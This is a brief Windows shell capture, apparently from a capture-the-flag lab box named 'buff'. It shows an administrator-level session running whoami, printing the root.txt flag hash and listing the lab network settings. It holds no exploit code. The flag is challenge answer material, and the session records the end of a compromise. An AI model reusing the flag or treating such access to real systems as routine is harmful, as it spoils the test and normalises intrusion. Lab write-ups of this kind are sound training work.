C:\Users\Administrator\Desktop>whoami
whoami
buff\administrator

C:\Users\Administrator\Desktop>type root.txt
type root.txt
7ddf32e17a6ac5ce04a8ecbf782ca509
C:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::78f4:12d0:34b6:1e3a
   Temporary IPv6 Address. . . . . . : dead:beef::e03a:836c:2375:6632
   Link-local IPv6 Address . . . . . : fe80::78f4:12d0:34b6:1e3a%10
   IPv4 Address. . . . . . . . . . . : 10.10.10.198
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:75a0%10
                                       10.10.10.2

